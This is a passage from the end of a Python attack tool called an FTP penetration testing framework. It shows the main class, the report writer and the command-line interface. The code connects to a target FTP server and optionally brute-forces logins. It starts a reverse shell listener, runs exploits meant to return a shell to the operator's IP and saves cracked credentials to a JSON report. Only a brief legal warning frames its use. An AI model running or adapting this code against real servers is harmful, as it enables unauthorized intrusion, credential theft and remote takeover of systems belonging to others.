        report += "\nVulnerabilities:\n"
        report += "─" * 76 + "\n"
        
        if vulnerabilities:
            for idx, vuln in enumerate(vulnerabilities, 1):
                report += f"\n[{idx}] {vuln['name']}\n"
                report += f"    Severity: {vuln['severity']}\n"
                report += f"    Description: {vuln['description']}\n"
                if 'recommendation' in vuln:
                    report += f"    Recommendation: {vuln['recommendation']}\n"
        else:
            report += "  (None found)\n"
        
        report += "\n\nSuccessful Exploits:\n"
        report += "─" * 76 + "\n"
        
        if exploits:
            for idx, (exploit_type, detail, payload) in enumerate(exploits, 1):
                report += f"\n[{idx}] {exploit_type}\n"
                report += f"    Detail: {detail}\n"
                report += f"    Payload: {payload[:100]}...\n"
        else:
            report += "  (None executed successfully)\n"
        
        report += """

Recommendations:
────────────────────────────────────────────────────────────────────────────
1. Disable anonymous FTP access if not required
2. Implement strong authentication mechanisms
3. Disable dangerous FTP commands (SITE EXEC, SITE CHMOD)
4. Restrict write permissions to necessary directories only
5. Enable FTP over TLS/SSL (FTPS) or use SFTP instead
6. Implement rate limiting for failed authentication attempts
7. Regular security audits and vulnerability assessments
8. Keep FTP server software up to date
9. Use firewall rules to restrict FTP access
10. Implement comprehensive logging and monitoring

═══════════════════════════════════════════════════════════════════════════
                         End of Report
═══════════════════════════════════════════════════════════════════════════
"""
        
        # Save report
        report_file = f"ftp_pentest_report_{self.timestamp}.txt"
        with open(report_file, "w") as f:
            f.write(report)
        
        # Also save as JSON
        json_report = {
            "target": self.target_host,
            "timestamp": self.timestamp,
            "vulnerabilities": vulnerabilities,
            "credentials": [{"username": u, "password": p} for u, p in credentials],
            "exploits": [{"type": t, "detail": d, "payload": p} for t, d, p in exploits]
        }
        
        json_file = f"ftp_pentest_report_{self.timestamp}.json"
        with open(json_file, "w") as f:
            json.dump(json_report, f, indent=2)
        
        logging.info(f"\n✓ Report saved to: {report_file}")
        logging.info(f"✓ JSON report saved to: {json_file}")
        
        return report

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN FRAMEWORK CLASS
# ═══════════════════════════════════════════════════════════════════════════════

class FTPPenTestFramework:
    """Main penetration testing framework"""
    
    def __init__(self, target: str, port: int = 21, reverse_ip: str = None, 
                 reverse_port: int = 4444, username: str = "anonymous", 
                 password: str = "anonymous"):
        self.target = target
        self.port = port
        self.reverse_ip = reverse_ip or self._get_local_ip()
        self.reverse_port = reverse_port
        self.username = username
        self.password = password
        
        self.ftp_manager = None
        self.vulnerabilities = []
        self.credentials = []
        self.exploits = []
        
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def run_full_assessment(self, brute_force: bool = False, 
                           start_listener: bool = True):
        """Run complete penetration test"""
        
        print(BANNER)
        
        logging.info(f"Target: {self.target}:{self.port}")
        logging.info(f"Reverse connection: {self.reverse_ip}:{self.reverse_port}")
        logging.info("")
        
        # Phase 1: Connection
        logging.info("[Phase 1] Establishing FTP connection...")
        self.ftp_manager = FTPConnectionManager(self.target, self.port)
        
        if not self.ftp_manager.connect(self.username, self.password):
            logging.error("Failed to connect. Trying brute force...")
            if brute_force:
                bruteforcer = FTPBruteForcer(self.target, self.port)
                self.credentials = bruteforcer.brute_force()
                
                if self.credentials:
                    user, pwd = self.credentials[0]
                    self.ftp_manager.connect(user, pwd)
                else:
                    logging.error("Brute force failed. Exiting.")
                    return
            else:
                return
        
        # Phase 2: Vulnerability Scanning
        logging.info("\n[Phase 2] Scanning for vulnerabilities...")
        scanner = FTPVulnerabilityScanner(self.ftp_manager)
        self.vulnerabilities = scanner.scan_all()
        
        # Phase 3: Start Listener
        if start_listener:
            logging.info("\n[Phase 3] Starting reverse shell listener...")
            listener = ListenerManager(self.reverse_port)
            listener.start_listener()
            time.sleep(2)
        
        # Phase 4: Exploitation
        logging.info("\n[Phase 4] Attempting exploitation...")
        executor = FTPExploitExecutor(
            self.ftp_manager, 
            self.reverse_ip, 
            self.reverse_port
        )
        
        success = executor.execute_all_exploits()
        self.exploits = executor.exploits_tried
        
        if success:
            logging.info("\n✓ Exploitation successful! Check your listener for shell.")
            time.sleep(3)
            PostExploitationModule.generate_post_exploit_guide(
                self.target
            )
        else:
            logging.warning("\n✗ No exploits were successful")
        
        # Phase 5: Report Generation
        logging.info("\n[Phase 5] Generating report...")
        reporter = ReportGenerator(self.target)
        report = reporter.generate_report(
            self.vulnerabilities,
            self.credentials,
            self.exploits
        )
        
        # Cleanup
        self.ftp_manager.disconnect()
        
        logging.info("\n" + "="*70)
        logging.info("Assessment completed!")
        logging.info("="*70)

# ═══════════════════════════════════════════════════════════════════════════════
# COMMAND LINE INTERFACE
# ═══════════════════════════════════════════════════════════════════════════════

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="FTP Advanced Penetration Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t 192.168.1.100
  %(prog)s -t 192.168.1.100 -u admin -p admin123
  %(prog)s -t 192.168.1.100 --brute-force
  %(prog)s -t 192.168.1.100 -r 10.0.0.5 -rp 5555 --no-listener
  
LEGAL WARNING: Use only on systems you own or have written permission to test!
        """
    )
    
    # Required arguments
    parser.add_argument("-t", "--target", required=True,
                       help="Target FTP server IP or hostname")
    
    # Optional arguments
    parser.add_argument("-p", "--port", type=int, default=21,
                       help="FTP port (default: 21)")
    parser.add_argument("-u", "--username", default="anonymous",
                       help="FTP username (default: anonymous)")
    parser.add_argument("-pw", "--password", default="anonymous",
                       help="FTP password (default: anonymous)")
    
    # Reverse shell settings
    parser.add_argument("-r", "--reverse-ip",
                       help="Reverse shell IP (auto-detected if not provided)")
    parser.add_argument("-rp", "--reverse-port", type=int, default=4444,
                       help="Reverse shell port (default: 4444)")
    
    # Features
    parser.add_argument("--brute-force", action="store_true",
                       help="Enable credential brute forcing")
    parser.add_argument("--no-listener", action="store_true",
                       help="Don't start automatic listener")
    
    # Logging
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Enable verbose output")
    
    return parser.parse_args()

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n\n[!] Interrupted by user. Cleaning up...")
    sys.exit(0)

def main():
    """Main entry point"""
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Parse arguments
    args = parse_arguments()
    
    # Setup logging
    log_file = setup_logging(args.verbose)
    logging.info(f"Logging to: {log_file}")
    
    # Create framework instance
    framework = FTPPenTestFramework(
        target=args.target,
        port=args.port,
        reverse_ip=args.reverse_ip,
        reverse_port=args.reverse_port,
        username=args.username,
        password=args.password
    )
    
    # Run assessment
    framework.run_full_assessment(
        brute_force=args.brute_force,
        start_listener=not args.no_listener
    )

if __name__ == "__main__":
    main()
